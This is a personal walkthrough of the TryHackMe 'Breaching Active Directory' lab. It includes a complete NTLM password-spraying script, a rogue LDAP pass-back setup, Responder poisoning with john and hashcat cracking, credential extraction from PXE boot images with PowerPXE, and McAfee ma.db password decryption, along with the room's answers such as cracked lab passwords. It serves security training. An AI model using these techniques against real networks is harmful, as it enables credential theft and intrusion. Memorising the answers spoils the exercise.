# Breaching Active Directory





[TOC]





================

## Task 1.INTRODUCTION TO AD BREACHES

If you are using a Kali VM, Network Manager is most likely used as DNS manager. You can use GUI Menu to configure DNS:

```bash
# Network Manager -> Advanced Network Configuration -> Your Connection -> IPv4 Settings
# Ensure Method set to: Automatice(DHCP) addresses only.
# Set your DNS IP here to the IP for THMDC in the network diagram above
# Add another DNS such as 8.8.8.8 or similar to ensure you still have internet access
# Run sudo systemctl restart NetworkManager 

$ sudo systemctl restart NetworkManager
```

![Networkmanager.conf](images/Networkmanager.conf.png)

Test Your DNS :

```bash
$ nslookup thmdc.za.tryhackme.com                 
Server:         10.200.25.101
Address:        10.200.25.101#53

Name:   thmdc.za.tryhackme.com
Address: 10.200.25.101

```

## Task 2.OSINT and Phishing

<details>
    <summary>What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
HaveIBeenPwned
</details>

## 

## Task 3.NTLM Authenticated Services



```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])

```





![Screen Shot 2023-01-24 at 11.23.38 PM](images/thm.breach.01.png)

Authenticating web application with a valid credential pair

| <img src="images/thm.breach.02.png" alt="Screen Shot 2023-01-24 at 11.42.13 PM" style="zoom:67%;" /> | ![Screen Shot 2023-01-24 at 11.42.27 PM](images/thm.breach.03.png) |
| ------------------------------------------------------------ | ------------------------------------------------------------ |



#### Section Answers

<details>
    <summary> What is the name of the challenge-response authentication mechanism that uses NTLM?</summary> 
 <!-- empty line *️⃣  -->
NetNTLM
</details>
<details>
    <summary>What is the username of the third valid credential pair found by the password spraying script?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
gordon.stevens
</details>

<details>
    <summary>How many valid credentials pairs were found by the password spraying script?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
4
</details>

<details>
    <summary>What is the message displayed by the web application when authenticating with a valid credential pair?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
 Hello World
</details>


## Task 4.LDAP Bind Credential



### LDAP Pass-Back Attack

Let's capture the testing over port 389

| ![breachad.5](images/breachad.5.png) | ![breachad.4](images/breachad.4.png) |
| ------------------------------------ | ------------------------------------ |
|                                      |                                      |

#### Intalling rogue LDAP

```bash
# Install OpenLDAP
─$ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

```

![breachad.1](images/breachad.1.png)

Adding you prefered password

| ![breachad.3](images/breachad.3.png) | ![breachad.2](images/breachad.2.png) |
| ------------------------------------ | ------------------------------------ |



Reconfigure the rogue LDAP

```bash
$ sudo dpkg-reconfigure -p low slapd
```

![Screen.1](images/Screen.1.png)

![Screen.2](images/Screen.2.png)



![Screen.3](images/Screen.3.png)

![Screen.4](images/Screen.4.png)

![Screen.5](images/Screen.5.png)

![Screen.6](images/Screen.6.png)



![Screen.7](images/Screen.7.png)



![Screen.8](images/Screen.8.png)



![Screen .11](images/Screen%20.11.png)



#### Downgrade LDAP to Vulnerable Authentication



To make the LDAP vulnerable we will configure our LDAP server only supports PLAIN and LOGIN authentication methods

```bash
# create properties file
$ cat olcSaslSecProps.ldif 
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

```



```bash
# restart LDAP with new properties file
$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"

# Verify the Authentication mechanizm
$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN

```



Capture printer request

```bash
─$ sudo tcpdump -SX -i breachad tcp port 389

```

![breackad.123](images/breackad.123.png)

Found password

![breachad.faf](images/breachad.faf.png)

<details>
    <summary> What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems?</summary> 
 <!-- empty line *️⃣  -->
LDAP Pass-back attack
</details>

<details>
    <summary>What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the authentication and make it clear text?</summary> 
 <!-- empty line *️⃣  -->
Plain, Login
</details>

<details>
    <summary>What is the message displayed by the web application when authenticating with a valid credential pair?</summary> 
 <!-- empty line *️⃣  -->
tryhackmeldappass1@
</details>


## Task 5.Authentication Relays



#### Working with the responder

```bash
$ git clone https://github.com/lgandx/Responder.git
```

![breachad.103](images/breachad.103.jpeg)



##### Review and adjust the responder config as needed

![breachad.104](images/breachad.104.jpeg)



Identify the interface connected to the THM lab

![breachad.102](images/breachad.102.jpeg)



```bash
$ sudo python3 Responder.py -I breachad
```



##### Issues

While running the responder the bellow exception was raised

```
[!] Error starting TCP server on port 389, check permissions or other servers running.
[+] Exiting...

```

##### Fix:

identify the process using the 389 and stop it

```bash
└─$ sudo lsof -i tcp:389 -s tcp:listen
[sudo] password for kali: 
COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
slapd   62936 openldap    8u  IPv4 242103      0t0  TCP *:ldap (LISTEN)
slapd   62936 openldap    9u  IPv6 242104      0t0  TCP *:ldap (LISTEN)
                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Docs/THM/AD.Attack/Responder]
└─$ service slapd stop 
```



A few minutes later

```bash
$ sudo python3 Responder.py -I breachad
```

![breach.12](images/breach.12.jpeg)

![breach.424](images/breach.424.jpeg)



#### Cracking the Hash using john

```bash
$ john --wordlist=passwordlist.txt hashes.txt 
```

![adbreach.4242](images/adbreach.4242.jpeg)

#### Cracking the Hash using hash cat

```bash
$ hashcat -m 5600 hashes.txt passwordlist.txt --force
```

![adbreach.5454](images/adbreach.5454.jpeg)

> Issues:
>
> ```bash
> device #1 not enough allocatable device memory for this attack.
> ```
>
> Fix:
>
> increasing the size of VM memory


<details>
    <summary>  What is the name of the tool we can use to poison and capture authentication requests on the network?</summary> 
 <!-- empty line *️⃣  -->
Responder
</details>
<details>
    <summary>What is the username associated with the challenge that was captured?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
SVCFILECOPY
</details>
<details>
    <summary>What is the value of the cracked password associated with the challenge that was captured?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
FPassword1!
</details>


## Task 6.Microsoft Deployment Toolkit



#### PXE Boot Image Retrieval

<img src="images/breachad.pxe.jpeg" alt="breachad.pxe" style="alignleft" />

| ![breachad.ssh](images/breachad.ssh.jpeg) | ![breachad.nslookup](images/breachad.nslookup.jpeg) |
| ----------------------------------------- | --------------------------------------------------- |





```powershell
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

thm@THMJMP1 C:\Users\thm>cd Documents

thm@THMJMP1 C:\Users\thm\Documents>mkdir 0XFK

thm@THMJMP1 C:\Users\thm\Documents>copy c:\powerpxe 0XFK\
c:\powerpxe\LICENSE
c:\powerpxe\PowerPXE.ps1
c:\powerpxe\README.md
        3 file(s) copied.
```



```powershell
thm@THMJMP1 C:\Users\thm\Documents\0XFK>tftp -i 10.200.32.202 GET "\Tmp\x64{F95E60C5-C07C-469C-9C22-7980623C8896}.bcd" 
conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s

thm@THMJMP1 C:\Users\thm\Documents\0XFK>Powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm\Documents\0XFK> Import-Module .\PowerPXE.ps1
PS C:\Users\thm\Documents\0XFK> $BCDFile = "conf.bcd"
PS C:\Users\thm\Documents\0XFK> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim  
\Boot\x64\Images\LiteTouchPE_x64.wim  #<----- location to be used in download
PS C:\Users\thm\Documents\0XFK> tftp -i 10.200.32.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim"
PS C:\Users\thm\Documents\0XFK> tftp -i 10.200.32.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim"  pxeboot.wim
Transfer successful: 341899611 bytes in 141 second(s), 2424819 bytes/s

```



```powershell
PS C:\Users> tftp -i 10.200.32.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim"  pxeboot.wim
```

### Recovering Credentials from a PXE Boot Image

```powershell
PS C:\Users\thm\Documents\0XFK> Get-FindCredentials -WimFile .\pxeboot.wim
>> Open .\pxeboot.wim 
New-Item : An item with the specified name C:\Users\thm\Documents\0XFK\ already exists. 
At C:\Users\thm\Documents\0XFK\PowerPXE.ps1:212 char:13
+     $null = New-Item -ItemType directory -Path $WimDir
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceExists: (C:\Users\thm\Documents\0XFK\:String) [New-Item], IOException
    + FullyQualifiedErrorId : DirectoryExist,Microsoft.PowerShell.Commands.NewItemCommand
 
>>>> Finding Bootstrap.ini 
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@
PS C:\Users\thm\Documents\0XFK> Get-FindCredentials -WimFile .\pxeboot.wim
```



<details>
    <summary>  What Microsoft tool is used to create and host PXE Boot images in organisations?</summary> 
 <!-- empty line *️⃣  -->
Microsoft Deployment Toolkit
</details>
<details>
    <summary>What network protocol is used for recovery of files from the MDT server?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
tftp
</details>
<details>
    <summary>What is the username associated with the account that was stored in the PXE Boot image?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
svcMDT
</details>
<details>
    <summary>What is the password associated with the account that was stored in the PXE Boot image?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
PXEBootSecure1@
</details>




## Task 7.Configuration Files





```bash
kali@kali:~/Docs/THM/AD.Attack/BreachAD.Task.7.confiles$ scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
thm@thmjmp1.za.tryhackme.com's password: 
ma.db                                                                                                                    100%  118KB 165.3KB/s   00:00    
                                                                                                                                                     
kali@kali:~/Docs/THM/AD.Attack/BreachAD.Task.7.confiles$ sqlitebrowser ma.db   
```

![adbreach.task7.2](images/adbreach.task7.2.jpeg)

![adbreach.task7.1](images/adbreach.task7.1.jpeg)



Python3 for mcafee pwd decrypt can be found here

https://github.com/AliDarwish786/mcafee-sitelist-pwd-decryption/blob/master/mcafee_sitelist_pwd_decrypt.py

```bash
kali@kali:~/Docs/THM/AD.Attack/BreachAD.Task.7.confiles$ ./mcafee-pwd-decrypt.py 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
```

![Screen Shot 2023-02-05 at 1.23.37 PM](images/Screen%20Shot%202023-02-05%20at%201.23.37%20PM.jpg)



<details>
    <summary>   What type of files often contain stored credentials on hosts?</summary> 
 <!-- empty line *️⃣  -->
configuration files
</details>
<details>
    <summary>What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
ma.db
</details>
<details>
    <summary>What table in this database stores the credentials of the orchestrator?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
AGENT_REPOSITORIES
</details>
<details>
    <summary>What is the username of the AD account associated with the McAfee service?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
svcAV
</details>
<details>
    <summary>

What is the password of the AD account associated with the McAfee service?</summary> <!-- Good place for a CTA (Call to Action) -->
 <!-- empty line *️⃣  -->
MyStrongPassword!
</details>



[1]: https://github.com/lgandx/Responder	"IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay."

